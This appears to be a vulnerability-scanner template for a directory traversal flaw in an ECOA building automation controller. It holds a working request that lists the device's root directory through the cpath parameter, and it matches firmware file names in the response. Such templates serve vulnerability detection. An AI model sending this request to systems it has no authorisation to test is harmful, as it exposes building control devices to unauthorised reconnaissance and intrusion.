id: ecoa-building-directory-traversal

info:
  name: ECOA Building Automation System - Directory Traversal Content Disclosure
  author: gy741
  severity: high
  description: The BAS controller suffers from a directory traversal content disclosure vulnerability. Using the GET parameter cpath in File Manager (fmangersub), attackers can disclose directory content on the affected device
  reference: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5670.php
  tags: ecoa,traversal

requests:
  - raw:
      - |
        GET /fmangersub?cpath=/ HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        words:
          - "bacevent.elf"
          - "redown.elf"
          - "system.bin"
        condition: and
